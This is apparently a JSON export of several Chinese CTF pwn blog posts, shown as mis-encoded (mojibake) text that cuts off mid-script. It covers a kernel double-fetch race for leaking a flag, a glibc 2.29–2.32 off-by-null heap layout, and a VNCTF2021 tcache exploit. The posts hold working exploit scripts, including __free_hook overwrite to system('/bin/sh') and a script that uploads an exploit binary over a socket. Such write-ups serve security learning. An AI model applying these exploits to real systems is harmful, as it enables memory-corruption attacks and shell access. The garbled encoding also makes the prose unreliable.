ä¹æ‰€æœ‰çš„è¾“å‡ºä¿¡æ¯ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æ‰“å¼€babyè¿™ä¸ªdevï¼Œå°±èƒ½å¤Ÿå¾—åˆ°é‡Œé¢printkå‡½æ•°çš„ç›¸å…³è¾“å‡ºï¼Œç„¶åæŠŠè¾“å‡ºé‡å®šå‘åˆ°/tmp/record.txtè¿™é‡Œé¢ï¼Œå†ä»record.txtä¸­è·å–åœ°å€ã€‚åŒæ—¶ç”±äºæ˜¯æ‰€æœ‰çš„è¾“å‡ºä¿¡æ¯ï¼Œæ‰€ä»¥è¿”å›ç»™æˆ‘ä»¬çš„flagåœ°å€è‚¯å®šæ˜¯åœ¨æœ€åé¢çš„ï¼Œæ‰€ä»¥lseek(allInfo_fd,-0x1000,SEEK_END);ä»æœ€åé¢å¾€å‰è·å–0x1000ä¸ªå­—èŠ‚ï¼Œç„¶åå†æ¥ç”¨strstrè·å–å­å­—ç¬¦ä¸²ç´¢å¼•ï¼Œæœ€åstrtoullè½¬æ¢åœ°å€å¾—åˆ°å†…æ ¸ä¸­flagçš„åœ°å€ã€‚\n\n![6](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png)\n\n(3)ç„¶ååˆ›å»ºçº¿ç¨‹ï¼Œçˆ†ç ´ä¿®æ”¹æ•°æ®ä¸­flagæŒ‡å‘çš„åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nMyflagStruc myflag;\nmyflag.len = 33;\nmyflag.flag = buf;\npthread_create(&myflag, NULL, change_attr_value,&myflag);\nfor(int i = 0; i < 0x1000; i ++){\n    ret = ioctl(fd, 0x1337, &myflag);\n    myflag.flag = buf;\n}\nfinish = 1;\npthread_join(myflag, NULL);\nclose(fd);\nputs(\"[+]result is :\");\nsystem(\"dmesg | grep flag\");\n```\n\nçº¿ç¨‹æ–¹é¢è¿™æ¶‰åŠå›è°ƒå‡½æ•°ç›¸å…³çŸ¥è¯†ï¼Œè‡ªå·±è¡¥å§ã€‚\n\n(4)çº¿ç¨‹å›è°ƒå‡½æ•°ï¼šä¿®æ”¹flagæŒ‡å‘å†…æ ¸çš„flagï¼Œä»è€Œèƒ½å¤Ÿé€šè¿‡é€å­—èŠ‚éªŒè¯\n\n```\n#æ³¨é‡Šå¤´\n\nvoid changeFlagAddr(void *myflag){\n    while(finish==0){\n        myflag->flag = kernelFlag_addr ;\n    }\n}\n```\n\n \n\n4.ä¸€äº›æ³¨æ„äº‹é¡¹ï¼š\n\n(1)å¤´æ–‡ä»¶çš„æ³¨æ„äº‹é¡¹ï¼Œå’Œå†™å°ç¨‹åºä¸€æ ·ï¼Œè‡ªå·±åŠ ã€‚\n\n(2)çº¿ç¨‹æ³¨æ„äº‹é¡¹ï¼šgccç¼–è¯‘æ—¶éœ€è¦åŠ ä¸Š-lpthreadå‚æ•°ï¼Œå¹¶ä¸”è¦é™æ€ç¼–è¯‘ã€‚\n\n(3)è¾“å…¥è¾“å‡ºé‡å®šå‘ï¼šæˆ‘çœ‹å¾ˆå¤šexpéƒ½æœ‰å…³é—­è¾“å…¥è¾“å‡ºæµçš„ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œä¸ç”¨å…³å…¶å®ä¹Ÿå¯ä»¥ï¼Œå¯èƒ½æ˜¯å¯¹åº”çš„ç¯å¢ƒå…³ç³»å§ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsetvbuf(stdin,0,2,0);\nsetvbuf(stdout,0,2,0);\nsetvbuf(stderr,0,2,0);\n```\n\n(4)æ–‡ä»¶ä¼ è¾“æ¨¡å—ï¼š\n\nå…ˆè½¬å‘ä¸€ä¸‹å¯åŠ¨ç¨‹åºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsocat tcp-listen:30000,fork exec:./boot.sh,reuseaddr\n```\n\nå¯ä»¥ç”¨ä¸‹åˆ—è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬å‚ç…§è¿™ä½å¸ˆå‚…çš„ï¼š\n\nhttps://blog.csdn.net/seaaseesa/article/details/104537991\n\n```\n#æ³¨é‡Šå¤´\n\n# coding:utf8\nfrom pwn import *\nimport base64\n \nsh = remote('127.0.0.1',30000)\n \n#exploit\nf = open('./exp','rb')\ncontent = f.read()\ntotal = len(content)\nf.close()\n\n# segment send\nper_length = 0x200;\n# touch file\nsh.sendlineafter('$ ','touch /tmp/exploit')\n\nlog.info(\"Total length:%d\"%total)\nfor i in range(0,total,per_length):\n   bstr = base64.b64encode(content[i:i+per_length])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n   print(i)\n   \nif total - i > 0:\n   bstr = base64.b64encode(content[total-i:total])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n \nsh.sendlineafter('$ ','chmod +x /tmp/exploit')\nsh.sendlineafter('$ ','/tmp/exploit')\nsh.interactive()\n```\n\n(5)è°ƒè¯•æ¨¡å—ï¼š\n\nå…³äºæ–‡ä»¶ç³»ç»Ÿçš„é€‰æ‹©æ–¹é¢ï¼Œç”¨ç²¾ç®€ç‰ˆçš„Busyboxå¼€å‡ºæ¥çš„qemuè°ƒè¯•çš„æ—¶å€™è·å–åŠ è½½æ¨¡å—çš„åŸºåœ°å€æ€»æ˜¯å‡ºé”™ï¼Œæš‚æ—¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆåé¢è¡¥ã€‚\n\nä½†æ˜¯å¯ä»¥ç”¨2018å¼ºç½‘æ¯coreçš„æ–‡ä»¶ç³»ç»Ÿï¼ŒåŠ è½½ä¹‹åè°ƒè¯•çš„åŸºåœ°å€æ²¡é—®é¢˜ï¼Œè¿™ä¸ªåœ¨ctfwikiä¸Šæœ‰ã€‚\n\n \n\n","tags":["kernelé¢˜"],"categories":["pwn-kernel","Kernel_doubleFetch"]},{"title":"2.29-2.32ä¸‹çš„off-by-null","url":"/2021/08/14/2.29-2.32ä¸‹çš„off-by-null/","content":"\næœ€è¿‘å‘ç°ä¸€ç§å¯¹äºé«˜ç‰ˆæœ¬libcæ›´å¥½çš„æ–¹æ³•ï¼Œä¸ç”¨çˆ†ç ´ï¼Œå…ˆè´´ä¸‹è¿æ¥ï¼š\n\nhttps://www.anquanke.com/post/id/236078#h3-7\n\nè€Œä¸”è¿™ä¸ªå¯ä»¥è¯´æ˜¯é€šæ€é™¤äº†2.33ç‰ˆæœ¬çš„æ‰€æœ‰Libcï¼Œå› ä¸ºæ²¡ç”¨ç”¨åˆ°tcacheå’Œfastbinï¼Œè¿™ä½å¤§ä½¬WJHå¸ˆå‚…çœŸæ˜¯ç¥ä»™ã€‚ä½†æ˜¯ä»–çš„æœ‰äº›åœ°æ–¹æœ‰ç‚¹å‡ºå…¥ï¼Œåˆšå¼€å§‹è°ƒè¯•çš„æ—¶å€™å®¹æ˜“ç›´æ¥å¹²è’™ï¼Œæ‰€ä»¥è¿™é‡Œæ€»ç»“ä¸€ä¸‹ã€‚\n\nâ–²æ€»çš„æ¥è¯´æ˜¯è¿ç”¨unsortedbinæ¥è¸©åœ°å€ï¼Œç„¶åå†å€Ÿç”¨unsortedbinå’ŒLargebinåŠ ä¸Šoff-by-nullæ¥ä¿®å¤fdï¼Œbkï¼Œä»è€Œèƒ½å¤Ÿé€šè¿‡æ–°å¢çš„æ£€æŸ¥ã€‚è¿™é‡Œæˆ‘æ‹¿\n\nç¬¬ä¸‰å±Šå±±ä¸œæ–°ä¸€ä»£ä¿¡æ¯æŠ€æœ¯åˆ›æ–°åº”ç”¨å¤§èµ› werewolf2ï¼ŒåŸé¢˜æ˜¯2.27çš„ï¼Œè¿™é‡Œç”¨2.31æ¨¡æ‹Ÿä¸€ä¸‹ã€‚\n\nè¿™é“é¢˜æ¥ä¸¾ä¾‹ï¼Œé¢˜ç›®ä¸åŒchunkçš„ç´¢å¼•å¯¹åº”å˜åŒ–ã€‚\n\n1.é¦–å…ˆå †é£æ°´å¸ƒå±€ï¼Œè®©æˆ‘ä»¬ä¹‹åç”³è¯·ç”¨æ¥åˆ©ç”¨çš„chunkçš„åä¸€ä¸ªå­—èŠ‚å¯æ§ï¼Œå°±æ˜¯å¾—ä¸º0x00ï¼Œæ–¹ä¾¿off-by-nullåˆ©ç”¨ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x1000-0x8-0xf0,'padd')#0\n```\n\nè¿™ä¸ªå †å¸ƒå±€çœ‹å…·ä½“çš„ç¯å¢ƒï¼Œæœ‰çš„é¢˜ä¸Šæ¥å…ˆç”³è¯·ä¸€å †å †å—ï¼Œå®¹æ˜“æè’™ï¼Œdè°ƒä¸€ä¸‹å°±çŸ¥é“äº†ã€‚\n\n2.ç„¶åå‡†å¤‡å †å—ï¼Œç»“åˆä¹‹å‰çš„å †å¸ƒå±€ï¼Œéœ€è¦æ»¡è¶³æ¡ä»¶ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x418,'\\x01'*0x410) #1 fd  0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk  0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk  0x---150\nadd(0x208,'\\x07'*0x200) #7\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png)\n\nå…¶ä¸­0x108å¤§å°çš„å †å—ä¸»è¦æ˜¯è¾…åŠ©åŠ éš”ç¦»ï¼Œç„¶å0x428ä¹‹ç±»çš„å‡ ä¸ªä¸åŒå¤§å°æ˜¯ä¸ºåˆ‡å‰²unsortedbinæ¥æäº‹ã€‚ç„¶åè¿™é‡Œæˆ‘ç”³è¯·äº†0x208å¤§å°çš„å †å—ï¼Œè¿™ä¸ªå †å—çš„ä½œç”¨ä¸»è¦å°±æ˜¯éš”ç¦»å’Œå¡«å……ï¼Œç„¶ååŸè´´çš„å¤§ä½¬ç”±äºsizeä½ç”¨åˆ°äº†\\x0aï¼Œæ˜¯ä¸ªæ¢è¡Œç¬¦ï¼ŒPwnä¸­ä¸€èˆ¬æ¯”éª„æ•æ„Ÿï¼Œå®¹æ˜“æ— æ³•å‘é€ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å¤šç”³è¯·0x100ï¼Œè®©ä¹‹åçš„sizeä½å˜æˆ\\x0bï¼Œæ–¹ä¾¿åˆ©ç”¨ã€‚\n\n3.ç„¶åå°±å¼€å§‹æäº‹ï¼Œé¦–å…ˆé‡Šæ”¾è¿™å‡ ä¸ªchunkã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(1)\nfree(4)\nfree(6)\nfree(3)\n```\n\næ»¡è¶³å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png)\n\né‡Šæ”¾é¡ºåºéœ€è¦æ³¨æ„ï¼Œè¦åˆ©ç”¨unsortedbinåœ¨0x---c00è¿™ä¸ªchunkä¸Šç•™ä¸‹0x---2b0å’Œ0x---150çš„åœ°å€ä½œä¸ºfdå’Œbkï¼Œä¹‹åå†ä¿®å¤fd->bkå’Œbk->fdï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png)\n\nå…¶ä¸­ä¸¤ä¸ªchunkåˆå¹¶äº†ç»„æˆäº†0x---7e0è¿™ä¸ªchunkï¼Œæ–¹ä¾¿åˆ‡å‰²ä¹‹åä¿®æ”¹0x---c00çš„sizeä½ã€‚\n\n4.ä¹‹åç”³è¯·chunkï¼Œä»0x---7e0ä¸­ç”³è¯·åˆ‡å‰²ï¼Œä¿®æ”¹0x---c00çš„sizeä½ï¼ŒåŒæ—¶ä¼šè§¦å‘malloc_consolidateå°†0x---150å’Œ0x--2b0æ”¾å…¥largebinä¸­ï¼Œè¿™ä¸ªæ²¡å•¥ç”¨ï¼Œç›´æ¥ç”³è¯·å›æ¥å°±å¯ä»¥äº†ï¼Œä¸»è¦æ˜¯åˆ‡å‰²ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\nadd(0x418,'\\x09'*0x410) # 9     0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png)\n\n5.ä¹‹åå°±å¼€å§‹ä¿®å¤fdå’Œbkï¼Œåˆ©ç”¨0x---c20å’Œå¯¹åº”çš„fd,bkï¼Œè¿›å…¥unsortedbinæ¥ä¿®å¤ã€‚\n\n(1)ä¿®å¤fd:\n\nå…ˆé‡Šæ”¾0x---2b0ï¼Œç„¶åé‡Šæ”¾0x---c20ï¼Œåˆ©ç”¨unsortedbinæ¥ç»™0x---2b0çš„bkè¸©ä¸Š0x---c20çš„åœ°å€ï¼Œç„¶åç”³è¯·å›æ¥ï¼Œæ–¹ä¾¿ä¹‹åä¿®å¤bk(0x---150)ï¼ŒåŒæ—¶å°†è¸©ä¸‹çš„åœ°å€ä»0x---c20ä¿®æ”¹ä¸º0x---c00ï¼Œå³å¯ä¿®å¤æˆåŠŸã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(11)  #0x---2b0\nfree(9)   #0x---c20\nadd(0x418, 'PIG007nb')  # 12 0x---c20 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png)\n\n(2)ä¿®å¤bkï¼šé¦–å…ˆè¿›å…¥Unsortedbinä¸­è¸©åœ°å€\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(13)\nfree(10)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png)\n\næ²¡å•¥é—®é¢˜ ï¼Œä½†æ˜¯ç”³è¯·å›æ¥çš„æ—¶å€™æœ‰ç‚¹å¤§é—®é¢˜ï¼š\n\nâ‘ å¦‚æœå…ˆç”³è¯·0x---c20ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—unsortedbinä¸­é¡ºåºå˜ä¸ºï¼š\n\n0x---150 -> main_arena+96ï¼Œå¯¼è‡´åŸå…ˆçš„0x---150.fdè¢«ä¿®æ”¹ï¼Œæ— æ³•å®Œæˆä¿®å¤ã€‚\n\nâ‘¡å¦‚æœå…ˆç”³è¯·0x---150ï¼Œé‚£ä¹ˆç”±äºunsortedbinæœºåˆ¶ï¼Œä¾æ®fdéå†ï¼Œå°±ä¼šå…ˆéå†åˆ°0x---c20ï¼Œå¯¼è‡´0x---c20è§£é“¾æ”¾å…¥largebinä¸­ï¼Œunsortedbinä¸­çš„æƒ…å†µå’Œå…ˆç”³è¯·0x---c20æ˜¯ä¸€æ ·çš„ï¼Œå…ˆå˜æˆ0x---150 -> main_arena+96ï¼Œç„¶åæ‰ä¼šè¿”å›0x---150ï¼Œfdéƒ½ä¼šè¢«æ”¹ã€‚\n\nâ–²æ‰€ä»¥å…ˆå°†è¿™ä¸¤ä¸ªchunkæ”¾å…¥largebinä¸­ï¼Œä¾æ®largebinçš„æœºåˆ¶ï¼Œç”±äºè¿™ä¸¤ä¸ªchunkçš„å¤§å°ä¸åŒï¼Œç›´æ¥ç”³è¯·å¯¹åº”å¤§å°å°±èƒ½å¾—åˆ°å¯¹åº”çš„chunkï¼ŒåŒæ—¶ç”±äºlargebinæ’åˆ—ä¾æ®ä»å¤§åˆ°å°ï¼Œç”³è¯·æ—¶ä¹Ÿæ˜¯å…ˆéå†å¤§å°å†éå†fdï¼Œå¦‚æœæ‰€éœ€å¤§å°çš„é“¾ä¸­åªæœ‰è¯¥chunkï¼Œç›´æ¥è¿”å›ã€‚æ‰€ä»¥å°±å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§chunkï¼Œå°†è¿™ä¸¤ä¸ªchunkéƒ½æ”¾å…¥largebinä¸­ï¼Œé¡ºåºä¸ºï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x9F8,'\\x14') # 14 chunk into largebin\n```\n\nåŒæ—¶è¿™ä¸ªå¤§chunkä¹Ÿæ˜¯ä¹‹åéœ€è¦è§¦å‘çš„off-by-nullçš„chunk\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png)\n\nä¹‹åå†ç”³è¯·0x---150å¤§å°çš„chunkå°±èƒ½ç›´æ¥å¾—åˆ°äº†ï¼Œç°åœ¨å°±ä¿®å¤å®Œfdå’Œbkäº†ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x428, '') # 15 partial overwrite fd\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png)\n\n6.æœ€åç”¨off-by-nullæ¥è®¾ç½®è§¦å‘chunkçš„sizeä½\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png)\n\næ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼Œé‡Šæ”¾\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png)\n\nå¯ä»¥çœ‹åˆ°top_chunkå·²ç»å‘ä¸Šåˆå¹¶åˆ°0x---c00äº†ï¼Œä¹‹åå°±å…·ä½“çš„å…·ä½“åˆ†æå°±å®Œäº‹äº†ã€‚\n\nâ–²æœ€åè´´ä¸ªç®€å•çš„expï¼Œåªæ˜¯å¸ƒå±€çš„ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x1000-0x8-0xf0,'padd')#0\n\nadd(0x418,'\\x01'*0x410) #1 fd 0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk 0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk 0x---150\nadd(0x208,'\\x07'*0x200) #7\n\n#left fd bk in 0x---c00\nfree(1)\nfree(4)\nfree(6)\n\n#merge and carve to get 0x---c20 and change size which in 0x---c00 \nfree(3)\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\n\n#reply\nadd(0x418,'\\x09'*0x410) # 9 0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n\n#repair fd\nfree(11) #0x---2b0\nfree(9) #0x---c20\nadd(0x418, 'PIG007nb') # 12 0x---2b0 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n\n\n#repair bk\nfree(13)\nfree(10)\nadd(0x9F8,'\\x14'*0x9f0) # let 0x---150 0x---c20 into largebin\nadd(0x428, '') # 15 0x---150 to overflow \\x00 in fd\n\n#trigger off-by-null\n#add(0x418,'\\x16'*0x410) # 16 c20\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n \n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"2.32ä¸‹çš„tcacheåˆ©ç”¨-VNCTF2021 ff","url":"/2021/08/14/2.32ä¸‹çš„tcacheåˆ©ç”¨-VNCTF2021 ff/","content":"\né€šè¿‡è¿™é¢˜å­¦ä¹ ä¸‹2.32ä¸‹çš„tcacheï¼ŒåŒæ—¶è¿˜å­¦åˆ°å¥½å¤šä¸œè¥¿ã€‚\n\n1.å…ˆè§£æä¸‹é¢˜ç›®ï¼Œå¤§æ¦‚æ˜¯æä¾›äº†åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘ã€æ‰“å°å †å—çš„åŠŸèƒ½ï¼Œä¸è¿‡é™åˆ¶äº†åªèƒ½æ‰“å°ä¸€æ¬¡ã€ç¼–è¾‘ä¸¤æ¬¡ï¼ŒåŒæ—¶è¿˜é™åˆ¶äº†ä¸èƒ½åˆ†é…0x90åŠä»¥ä¸Šçš„å †å—ã€‚ç„¶åé‡Šæ”¾åŠŸèƒ½æŒ‡é’ˆæ²¡æ¸…ç©ºï¼Œæœ‰UAFï¼Œä¿æŠ¤å…¨å¼€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png)\n\n2.é¦–å…ˆæ³„éœ²åœ°å€ï¼šå› ä¸º2.32è¦åˆ©ç”¨doble-freeå¿…é¡»æ³„éœ²å †åœ°å€ï¼Œæ‰€ä»¥show()åŠŸèƒ½è‚¯å®šå…ˆè¢«ç”¨æ‰ï¼Œç›´æ¥ä»freeçš„chunkçš„fdæŒ‡é’ˆæ³„éœ²å‡ºheap_baseï¼Œå› ä¸º2.32çš„safe-linkingå¼‚æˆ–æœºåˆ¶å°±æ˜¯ä¸‹ä¸€ä¸ªchunkå’Œheap_baseå¼‚æˆ–æ”¾å…¥fdã€‚\n\né‚£ä¹ˆå°±æ€è€ƒä¹‹åæ€ä¹ˆæ³„éœ²Libcåœ°å€ï¼Œå¯ä»¥é€šè¿‡åŠ«æŒIOæ¥æ³„éœ²ï¼Œä½†æ˜¯åŠ«æŒIOä¹Ÿéœ€è¦libcåœ°å€æ‰è¡Œå•Šï¼Œè¿™é‡Œå°±ç”¨åˆ°çˆ†ç ´ï¼Œåˆ©ç”¨unsortebinæ¥ç•™ä¸‹åœ°å€åœ¨tcacheç»“æ„ä½“ä¸Šï¼Œç„¶åéƒ¨åˆ†å†™2ä¸ªå­—èŠ‚æ¥çˆ†ç ´åŠä¸ªå­—èŠ‚ã€‚å› ä¸ºIOå’Œmain_arenaå…¶å®ç›¸è·ä¸æ˜¯å¤ªè¿œï¼Œè°ƒè¯•å°±å¯ä»¥çŸ¥é“ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png)\n\n```python\n#æ³¨é‡Šå¤´\n\n#leak heap_base\nnew(0x80,'PIG007NB')\nfree()\nshow()\nheap_leak = u64(rc(5).ljust(8,'\\x00'))\nheap_base = heap_leak*0x1000\nlog.info(\"heap_base:0x%x\"%heap_base)\n\n#change key to make double free\nedit('PIG007NBPIG007NB')\nfree()\n\n#change 0x290(7) to free tcache(0x290) into unsortedbin\nedit(p64((heap_leak) ^ (heap_base + 0x10)))\nnew(0x80, 'PIG007NB')\nnew(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\nfree()\n#--------------------------------------------\nnew(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n#--------------------------------------------\n```\n\nè¢«#---------------------------åŒ…è£¹èµ·æ¥çš„éƒ¨åˆ†ï¼Œè¿™é‡Œåªèƒ½ç”³è¯·0x48æˆ–è€…0x88å¤§å°çš„ï¼Œå› ä¸ºtcacheç»“æ„ä½“è¢«ç ´åï¼Œå¾ˆå¤šbinçš„æ•°é‡å˜å¤§äº†ï¼Œä¸å†æ˜¯0x0ï¼Œä½†æ˜¯tcacheä¸­å¯¹åº”çš„Biné“¾è¡¨ä¸­ä»ç„¶æ˜¯0x0ï¼Œå†ç”³è¯·å¯¹åº”å¤§å°çš„å°±ä¼šè§¦å‘ç¨‹åºå¼‚å¸¸ï¼Œå…¶å®å°±æ˜¯æ”¾å…¥tcacheç©ºé—²biné“¾è¡¨çš„æ—¶å€™é”™è¯¯ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png)\n\n3.ç„¶åå°±æ˜¯åŠ«æŒIOæ³„éœ²åœ°å€:\n\n```python\n#æ³¨é‡Šå¤´\n\nnew(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\nnew(0x18,p16(0x66c0))\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n#new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n#this will be OK\nmain_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\ntest = main_arena>>40\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"test:0x%x\"%test)\nif(test != 0x7f):\n    return\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\n#stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n# log.info(\"stdout_addr:0x%x\"%stdout_addr)\n# obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n# libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\nsystem_addr = libc_base + obj.dump(\"system\")\n__free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n```\n\n4.æœ€åå°±æ˜¯å¡«å……ï¼Œå°†unsortedbinç”³è¯·å®Œä¹‹åï¼Œå°†unsortedbinä»Tcacheçš„ç»“æ„ä½“ä¸­è„±ç¦»å‡ºæ¥ï¼Œé˜²æ­¢å†ç”³è¯·çš„æ—¶å€™ä¹±å¥—ã€‚è¿™é‡Œç›´æ¥ä»topchunkç”³è¯·ï¼Œå®‰å…¨ä¸€ç‚¹ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x18,'PIG007NB')\nnew(0x18,'PIG007NB')\n\n\n#one_gadget = libc_base + 0xdf54c\nnew(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\nnew(0x38, p64(system_addr))\nnew(0x38, p64(system_addr))\n\nnew(0x10, b'/bin/sh\\x00')\npause()\nfree()\np.interactive()\n```\n\n5.æœ€åè´´ä¸ªçˆ†ç ´çš„expï¼Œæœ‰äº›å€Ÿé‰´äº†arttnba3å¸ˆå‚…çš„ï¼š\n\nhttps://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/\n\n```python\n#æ³¨é‡Šå¤´\n\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./pwn\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"libc_base:0x%x\"%libc_base)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n    #p = process(['./ld-2.32.so', './pwn'], env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n\ndef cmd(command):\n    p.recvuntil(b\">>\")\n    p.sendline(str(command).encode())\n\ndef 